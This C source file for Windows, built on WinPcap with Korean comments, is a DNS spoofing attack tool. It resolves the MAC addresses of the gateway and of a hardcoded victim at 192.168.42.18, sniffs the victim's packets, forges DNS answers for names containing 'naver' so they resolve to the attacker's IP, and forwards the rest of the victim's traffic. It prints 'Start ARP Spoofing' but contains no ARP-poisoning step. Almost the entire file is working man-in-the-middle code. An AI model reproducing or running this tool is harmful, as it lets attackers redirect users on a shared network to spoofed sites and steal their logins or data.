#include <WinSock2.h>
#include <iphlpapi.h>
#include <pcap.h>
#include <stdio.h>
#include <stdint.h>

#pragma warning(disable:4996)
#pragma warning(disable:6031)
#pragma warning(disable:6328)

#define ETH_LEN	6
#define IP_LEN	4

#define ETHERTYPE_ARP	0x0806
#define ETHERTYPE_IP	0x0800

#define ARPCODE_REQ		0x0001
#define ARPCODE_RLY		0x0002

bool get_adapters();
bool print_adapters(PIP_ADAPTER_ADDRESSES tmp);
bool insert_adapters_iist(PIP_ADAPTER_ADDRESSES tmp);
bool open_adapter(int _inum);
bool find_macaddr(uint8_t _src_ip[], uint8_t _dst_mac[]);
void print_info(uint8_t _addr[], int _len);
bool is_equal(uint8_t* _com1, uint8_t* _com2, int _len);
bool dnsspoofing();

typedef struct _adapter_list
{
	int			number;
	PCHAR		interfaceName;
	PWCHAR		FriendlyName;
	PWCHAR		adapterName;
	uint8_t		mac_addr[ETH_LEN];
	ULONG		ip_addr;
	ULONG		gate_addr;
	struct _adapter_list* next;
} Adapter_list, * pAdapter_list;

typedef struct _pcap_info
{
	uint8_t		attacker_ip[IP_LEN];
	uint8_t		attacker_mac[ETH_LEN];
	uint8_t		victim_ip[IP_LEN];
	uint8_t		victim_mac[ETH_LEN];
	uint8_t		gateway_ip[IP_LEN];
	uint8_t		gateway_mac[ETH_LEN];
	pcap_t* pcap_handle;
} pcap_info;

#pragma pack(push, 1)
struct ether_header
{
	uint8_t		dst_host[ETH_LEN];		// (8Bit x 6)	Destination MAC Address
	uint8_t		src_host[ETH_LEN];		// (8Bit x 6)	Source MAC Address
	uint16_t	ether_type;				// (16Bit)		Ethernet Type
};
#pragma pack(pop)

#pragma pack(push, 1)
struct arp_header
{
	uint16_t	hw_type;				// (16Bit)		Hardware Type
	uint16_t	protocol_type;			// (16Bit)		Protocol Type
	uint8_t		hw_size;				// (8Bit)		Hardware Size
	uint8_t		protocol_size;			// (8Bit)		Protocol Size
	uint16_t	opcode;					// (16Bit)		Opcode[1-4]
	uint8_t		sender_host[ETH_LEN];	// (8Bit x 6)	Sender MAC Address
	uint8_t		sender_ip[IP_LEN];		// (8Bit x 4)	Sender IP Address
	uint8_t		target_host[ETH_LEN];	// (8Bit x 6)	Target MAC Address
	uint8_t		target_ip[IP_LEN];		// (8Bit x 4)	Target IP Address
};
#pragma pack(pop)

#pragma pack(push, 1)
struct ip_header {
	uint8_t ip_version : 4; // ipv4
	uint8_t ip_header_len : 4; //Header Length
	uint8_t ip_tos;//Type of Service
	uint16_t ip_total_len;//Total Length
	uint16_t ip_id;
	uint16_t flags;
	uint8_t ip_TTL;
	uint8_t ip_protocol;
	uint16_t ip_checksum;
	uint8_t ip_src_addr[IP_LEN];
	uint8_t ip_dst_addr[IP_LEN];
	//20 bytes
};
#pragma pack(pop)

#pragma pack(push,1)
struct udp_header {
	uint16_t udp_src_port;
	uint16_t udp_dst_port;
	uint16_t udp_len;
	uint16_t udp_checksum;
	//8 bytes
};
#pragma pack(pop)
//DNS 헤더
#pragma pack(push, 1)
struct dns_header {
	uint16_t id;
	uint16_t dns_flags;
	//메세지가 질의(0)인지 응답(1)인지 구분
	uint16_t qst_count;
	uint16_t ans_count;
	uint16_t auth_num;
	uint16_t add_num;
};
#pragma pack(pop)
#pragma pack(push, 1)
struct dns_query {
	uint16_t record_type;//클라이언트가 요청하는 질의 유형
	uint16_t class_;//dns가 사용하는 특정프로토콜
};
#pragma pack(pop)

#pragma pack(push, 1)
struct dns_response {
	unsigned short name;
	unsigned short record_type; //클라이언트가 요청하는 질의 유형
	unsigned short class_;
	unsigned long ttl;
	unsigned short rsc_data_len;
	unsigned char response_ip[IP_LEN];//가변적..
};
#pragma pack(pop)


pAdapter_list head_list = NULL, tail_list = NULL, work_list = NULL;
pcap_info info = { 0 };

int main(int agrc, char* argv[])
{
	info.victim_ip[0] = 192;
	info.victim_ip[1] = 168;
	info.victim_ip[2] = 42;
	info.victim_ip[3] = 18;

	if (!get_adapters())
	{
		fprintf(stderr, "\n [!] get_adapters() Error...\n");
		return -1;
	}

	int input_adapter;
	fprintf(stdout, " Enter the interface number : ");
	scanf_s("%d", &input_adapter);

	if (!open_adapter(input_adapter))
	{
		fprintf(stderr, "\n [!] open_adapter() Error...\n");
		return -1;
	}

	fprintf(stdout, " Find Gateway MAC Address... ");
	if (!find_macaddr(info.gateway_ip, info.gateway_mac))
	{
		fprintf(stderr, "\n [!] find_macaddr() Error...\n");
		return -1;
	}
	fprintf(stdout, "OK\n");

	fprintf(stdout, " Find Victim MAC Address... ");
	if (!find_macaddr(info.victim_ip, info.victim_mac))
	{
		fprintf(stderr, "\n [!] find_macaddr() Error...\n");
		return -1;
	}
	fprintf(stdout, "OK\n");

	fprintf(stdout, "\n\n Attacker MAC Address : ");
	print_info(info.attacker_mac, ETH_LEN);
	fprintf(stdout, "\n Attacker IP Address : ");
	print_info(info.attacker_ip, IP_LEN);

	fprintf(stdout, "\n\n Victim MAC Address : ");
	print_info(info.victim_mac, ETH_LEN);
	fprintf(stdout, "\n Victim IP Address : ");
	print_info(info.victim_ip, IP_LEN);

	fprintf(stdout, "\n\n Gateway MAC Address : ");
	print_info(info.gateway_mac, ETH_LEN);
	fprintf(stdout, "\n Gateway IP Address : ");
	print_info(info.gateway_ip, IP_LEN);

	printf("\n\n Start ARP Spoofing...");
	if (!dnsspoofing())
	{
		fprintf(stderr, "\n [!] arpspoofing() Error...\n");
		return -1;
	}

	return 0;
}

bool get_adapters()
{
	DWORD dwRet;
	PIP_ADAPTER_ADDRESSES pAdpAddrs;
	PIP_ADAPTER_ADDRESSES tmp;
	unsigned long ulBufLen = sizeof(IP_ADAPTER_ADDRESSES);

	pAdpAddrs = (PIP_ADAPTER_ADDRESSES)malloc(ulBufLen);
	if (!pAdpAddrs) return false;
	dwRet = GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_GATEWAYS, NULL, pAdpAddrs, &ulBufLen);
	if (dwRet == ERROR_BUFFER_OVERFLOW)
	{
		free(pAdpAddrs);
		pAdpAddrs = (PIP_ADAPTER_ADDRESSES)malloc(ulBufLen);

		if (!pAdpAddrs)
			return false;
	}

	dwRet = GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_GATEWAYS, NULL, pAdpAddrs, &ulBufLen);
	if (dwRet != NO_ERROR)
	{
		free(pAdpAddrs);
		return false;
	}

	for (tmp = pAdpAddrs; tmp != NULL; tmp = tmp->Next)
	{
		if (print_adapters(tmp))
		{
			if (!insert_adapters_iist(tmp))
				return false;
		}
	}
	return true;
}

bool print_adapters(PIP_ADAPTER_ADDRESSES tmp)
{
	PIP_ADAPTER_UNICAST_ADDRESS pThisAddrs;
	PIP_ADAPTER_GATEWAY_ADDRESS pGateAddrs;

	static int count = 0;
	char fname_buf[BUFSIZ] = { 0 };
	char dname_buf[BUFSIZ] = { 0 };

	if (tmp->OperStatus == IfOperStatusUp)
	{
		WideCharToMultiByte(CP_ACP, 0, tmp->FriendlyName, wcslen(tmp->FriendlyName), fname_buf, BUFSIZ, NULL, NULL);
		fprintf(stdout, " %d) Adapter OS Name : %s \n", ++count, fname_buf);
		fprintf(stdout, "    Adapter Interface : %s \n", tmp->AdapterName);

		WideCharToMultiByte(CP_ACP, 0, tmp->Description, wcslen(tmp->Description), dname_buf, BUFSIZ, NULL, NULL);
		fprintf(stdout, "    Adapter Name : %s \n", dname_buf);

		for (pThisAddrs = tmp->FirstUnicastAddress; NULL != pThisAddrs; pThisAddrs = pThisAddrs->Next)
		{
			struct sockaddr_in* pAddr = (struct sockaddr_in*)pThisAddrs->Address.lpSockaddr;
			fprintf(stdout, "    Adapter IP : %s\n", inet_ntoa(pAddr->sin_addr));
		}

		fprintf(stdout, "    Adapter MAC : ");
		for (int i = 0; i < ETH_LEN; i++)
		{
			fprintf(stdout, "%.2x", tmp->PhysicalAddress[i]);
			if (i != 5)
				fprintf(stdout, ":");
		}
		fprintf(stdout, "\n    Gateway IP : ");
		for (pGateAddrs = tmp->FirstGatewayAddress; NULL != pGateAddrs; pGateAddrs = pGateAddrs->Next)
		{
			struct sockaddr_in* pAddr = (struct sockaddr_in*)pGateAddrs->Address.lpSockaddr;
			fprintf(stdout, "%s", inet_ntoa(pAddr->sin_addr));

		}
		fprintf(stdout, "\n\n");
		return true;
	}
	return false;
}

bool insert_adapters_iist(PIP_ADAPTER_ADDRESSES tmp)
{
	PIP_ADAPTER_UNICAST_ADDRESS pThisAddrs;
	PIP_ADAPTER_GATEWAY_ADDRESS pGateAddrs;

	static int number = 0;
	work_list = (Adapter_list*)malloc(sizeof(Adapter_list));
	if (work_list == NULL)
	{
		fprintf(stderr, "malloc() error...\n");
		return false;
	}
	work_list->number = ++number;
	work_list->interfaceName = tmp->AdapterName;
	work_list->FriendlyName = tmp->FriendlyName;
	work_list->adapterName = tmp->Description;

	for (int i = 0; i < ETH_LEN; i++)
		work_list->mac_addr[i] = tmp->PhysicalAddress[i];
	for (pThisAddrs = tmp->FirstUnicastAddress; NULL != pThisAddrs; pThisAddrs = pThisAddrs->Next)
	{
		struct sockaddr_in* pAddr = (struct sockaddr_in*)pThisAddrs->Address.lpSockaddr;
		work_list->ip_addr = htonl(inet_addr(inet_ntoa(pAddr->sin_addr)));
	}

	for (pGateAddrs = tmp->FirstGatewayAddress; NULL != pGateAddrs; pGateAddrs = pGateAddrs->Next)
	{
		struct sockaddr_in* pAddr = (struct sockaddr_in*)pGateAddrs->Address.lpSockaddr;
		work_list->gate_addr = htonl(inet_addr(inet_ntoa(pAddr->sin_addr)));
	}

	work_list->next = NULL;

	if (head_list == NULL)
	{
		head_list = work_list;
		tail_list = work_list;
		return true;
	}

	tail_list->next = work_list;
	tail_list = work_list;

	return true;
}

bool open_adapter(int _inum)
{
	char errbuf[PCAP_ERRBUF_SIZE];
	int i;
	char name[1000] = "\\Device\\NPF_";

	work_list = head_list;

	for (i = 1; i <= _inum; i++)
	{
		if (work_list->number == _inum)
			break;
		work_list = work_list->next;
	}

	strcat(name, work_list->interfaceName);

	for (i = 0; i < ETH_LEN; i++)
		info.attacker_mac[i] = work_list->mac_addr[i];

	for (int i = 0; i < IP_LEN; i++)
	{
		info.attacker_ip[i] = ((uint8_t*)&work_list->ip_addr)[3 - i];
		info.gateway_ip[i] = ((uint8_t*)&work_list->gate_addr)[3 - i];
	}

	info.pcap_handle = pcap_open(name, 65536, PCAP_OPENFLAG_PROMISCUOUS, 1, NULL, errbuf);
	if (info.pcap_handle == NULL)
	{
		fprintf(stderr, "\nUnable to open the adapter. %s is not supported by WinPcap\n", name);
		return false;
	}
	return true;
}

bool is_equal(uint8_t* _com1, uint8_t* _com2, int _len)
{
	bool result = true;

	for (int i = 0; i < _len; i++)
	{
		if (_com1[i] == _com2[i]) continue;
		else
		{
			result = false;
			break;
		}
	}
	return result;
}

bool find_macaddr(uint8_t _src_ip[], uint8_t _dst_mac[])
{
	unsigned char packet[2500] = { 0 };
	struct ether_header eth;
	struct arp_header arp;

	struct pcap_pkthdr* header;
	const unsigned char* data;
	int length = 0;
	//arp request packet
	//ethernet
	unsigned char BROADCAST_MAC[ETH_LEN] = { 0xff,0xff,0xff,0xff ,0xff,0xff };
	memcpy(&eth.dst_host, BROADCAST_MAC, ETH_LEN);
	memcpy(&eth.src_host, info.attacker_mac, ETH_LEN);
	eth.ether_type = htons(ETHERTYPE_ARP);
	memcpy(packet, &eth, sizeof(eth));
	length += sizeof(eth);

	//
	arp.hw_type = htons(0x0001);
	arp.protocol_type = htons(0x0800);
	arp.hw_size = 0x06;
	arp.protocol_size = 0x04;
	arp.opcode = htons(0x0001); //request
	memcpy(&arp.sender_host, info.attacker_mac, ETH_LEN);
	memcpy(&arp.sender_ip, info.attacker_ip, IP_LEN);
	memcpy(&arp.target_host, BROADCAST_MAC, ETH_LEN);
	memcpy(&arp.target_ip, _src_ip, IP_LEN);
	memcpy(packet + length, &arp, sizeof(arp));
	length += sizeof(arp);

	if (length < 60)
	{
		for (int i = length; i < 60; i++)
		{
			packet[i] = 0x00;
			length++;
		}

	}

	//done

	//packet capture
	while (1)
	{
		if (pcap_sendpacket(info.pcap_handle, packet, length) != 0)
		{
			printf("\n pcap_sendpacket() Error...\n");
			return FALSE;
		}

		if (pcap_next_ex(info.pcap_handle, &header, &data) <= 0)
			continue;

		struct ether_header* pEth = (struct ether_header*)data;
		int dataPointer = sizeof(*pEth);

		if (ntohs(pEth->ether_type) == ETHERTYPE_ARP)
		{
			struct arp_header* pArp = (struct arp_header*)(data + dataPointer);
			dataPointer += sizeof(*pArp);
			if (pArp->opcode == ntohs(0x0002))
			{
				if (pArp->sender_ip[0] == _src_ip[0] &&
					pArp->sender_ip[1] == _src_ip[1] &&
					pArp->sender_ip[2] == _src_ip[2] &&
					pArp->sender_ip[3] == _src_ip[3])
				{
					memcpy(_dst_mac, pEth->src_host, ETH_LEN);
					//printf("changed\n");

					return true;
				}
			}
		}
	}
	return true;

}

void print_info(uint8_t _addr[], int _len)
{
	int i;
	if (_len == ETH_LEN)
	{
		for (i = 0; i < _len; i++) {
			fprintf(stdout, "%.2x", _addr[i]);
			if (i != (ETH_LEN - 1))
				fprintf(stdout, ":");
		}
	}
	else if (_len == IP_LEN)
	{
		for (i = 0; i < _len; i++) {
			fprintf(stdout, "%u", _addr[i]);
			if (i != (IP_LEN - 1))
				fprintf(stdout, ".");
		}
	}
}

bool dnsspoofing()
{
	struct dns_query dq;
	struct dns_response dr;
	const unsigned char* data;
	unsigned char packet[2500] = { 0 };
	struct pcap_pkthdr* header;
	
	while (1)
	{
		if (pcap_next_ex(info.pcap_handle, &header, &data) <= 0)
			continue;
		struct ether_header* pEth = (struct ether_header*)data;
		int dataPointer = sizeof(*pEth);

		if (pEth->src_host[0] == info.victim_mac[0] &&
			pEth->src_host[1] == info.victim_mac[1] &&
			pEth->src_host[2] == info.victim_mac[2] &&
			pEth->src_host[3] == info.victim_mac[3] &&
			pEth->src_host[4] == info.victim_mac[4] &&
			pEth->src_host[5] == info.victim_mac[5] )
		{
			if (ntohs(pEth->ether_type) == 0x0800)
			{
				struct ip_header* pIp = (struct ip_header*)(data + dataPointer);
				dataPointer += sizeof(*pIp);
				if(pIp->ip_dst_addr[0]!=info.attacker_ip[0]||
					pIp->ip_dst_addr[1] != info.attacker_ip[1] || 
					pIp->ip_dst_addr[2] != info.attacker_ip[2] || 
					pIp->ip_dst_addr[3] != info.attacker_ip[3])
				if (pIp->ip_protocol == 0x11)
				{
					struct udp_header* pudp = (struct udp_header*)(data + dataPointer);
					dataPointer += sizeof(*pudp);
					if (ntohs(pudp->udp_dst_port) == 53)
					{
						struct dns_header* pdh = (struct dns_header*)(data + dataPointer);
						dataPointer += sizeof(*pdh);
						const unsigned char* name = (data + dataPointer);
						dataPointer += strlen((char *)name);
						if (strstr((char*)name, "naver"))
						{
							//eth
							memcpy(pEth->dst_host, info.victim_mac, ETH_LEN);
							memcpy(pEth->src_host, info.attacker_mac, ETH_LEN);
							pEth->ether_type = htons(0x0800);
							memcpy(packet, pEth, sizeof(*pEth));
							 int DataPointer = sizeof(*pEth);
							//ip
							unsigned char temp_ip[IP_LEN] = { 0 };
							memcpy(temp_ip, pIp->ip_dst_addr, IP_LEN);
							memcpy(pIp->ip_dst_addr, pIp->ip_src_addr, IP_LEN);
							memcpy(pIp->ip_src_addr, temp_ip, IP_LEN);
							pIp->ip_total_len = htons(sizeof(*pIp) + sizeof(*pudp) + sizeof(*pdh)+sizeof(dq) + sizeof(dr) + strlen((char*)name)+1);
							memcpy(packet+DataPointer, pIp, sizeof(*pIp));
							 DataPointer += sizeof(*pIp);
							//udp
							unsigned short temp_port;
							temp_port = pudp->udp_dst_port;
							pudp->udp_dst_port = pudp->udp_src_port;
							pudp->udp_src_port = temp_port;
							pudp->udp_len = htons(sizeof(*pudp) + sizeof(dq) + sizeof(*pdh)+sizeof(dr) + strlen((char*)name) + 1);
							memcpy(packet + DataPointer, pudp, sizeof(*pudp));
							 DataPointer += sizeof(*pudp);
							//dns header
							pdh->dns_flags = htons(0x8180);
							pdh->qst_count = htons(0x0001);
							pdh->ans_count = htons(0x0001);
							pdh->auth_num = htons(0x0000);
							pdh->add_num = htons(0x0000);
							memcpy(packet + DataPointer, pdh, sizeof(*pdh));
							 DataPointer += sizeof(*pdh);

							//dns query
							strcat((char*)(packet + DataPointer), (char *)name);
							DataPointer += strlen((char* )name);
							packet[DataPointer++]=0x00;
							dq.record_type = htons(0x0001);
							dq.class_ = htons(0x0001);
							memcpy(packet + DataPointer, &dq, sizeof(dq));
							 DataPointer += sizeof(dq);

							dr.name = htons(0xc00c);
							dr.record_type = htons(0x0001);
							dr.class_ = htons(0x0001);
							dr.ttl = htonl(0x0000000e);
							dr.rsc_data_len = htons(0x0004);
							memcpy(dr.response_ip, info.attacker_ip, IP_LEN);
							memcpy(packet + DataPointer, &dr, sizeof(dr));
							DataPointer += sizeof(dr);
							printf("check\n");
							pcap_sendpacket(info.pcap_handle, packet, DataPointer);

						}

					}
					else
					{
						//forwarding
						unsigned char temp[5000] = { 0 };
						memcpy(pEth->dst_host, info.gateway_mac, ETH_LEN);
						memcpy(pEth->src_host, info.attacker_mac, ETH_LEN);

						memcpy(temp, pEth, sizeof(*pEth));
						memcpy(temp + sizeof(*pEth), data + sizeof(*pEth), header->len - sizeof(*pEth));

						pcap_sendpacket(info.pcap_handle, temp, header->len);
					}
					
				}
				else
				{
					//forwarding
					unsigned char temp[5000] = { 0 };
					memcpy(pEth->dst_host, info.gateway_mac, ETH_LEN);
					memcpy(pEth->src_host, info.attacker_mac, ETH_LEN);

					memcpy(temp, pEth, sizeof(*pEth));
					memcpy(temp + sizeof(*pEth), data + sizeof(*pEth), header->len - sizeof(*pEth));

					pcap_sendpacket(info.pcap_handle, temp, header->len);
				}
				else
				{
					//forwarding
					unsigned char temp[5000] = { 0 };
					memcpy(pEth->dst_host, info.gateway_mac, ETH_LEN);
					memcpy(pEth->src_host, info.attacker_mac, ETH_LEN);

					memcpy(temp, pEth, sizeof(*pEth));
					memcpy(temp + sizeof(*pEth), data + sizeof(*pEth), header->len - sizeof(*pEth));

					pcap_sendpacket(info.pcap_handle, temp, header->len);
				}

			}
			else
			{
				//forwarding
				unsigned char temp[5000] = { 0 };
				memcpy(pEth->dst_host, info.gateway_mac, ETH_LEN);
				memcpy(pEth->src_host, info.attacker_mac, ETH_LEN);

				memcpy(temp, pEth, sizeof(*pEth));
				memcpy(temp + sizeof(*pEth), data + sizeof(*pEth), header->len - sizeof(*pEth));

				pcap_sendpacket(info.pcap_handle, temp, header->len);
			}
		}
		
	}
	return true;

}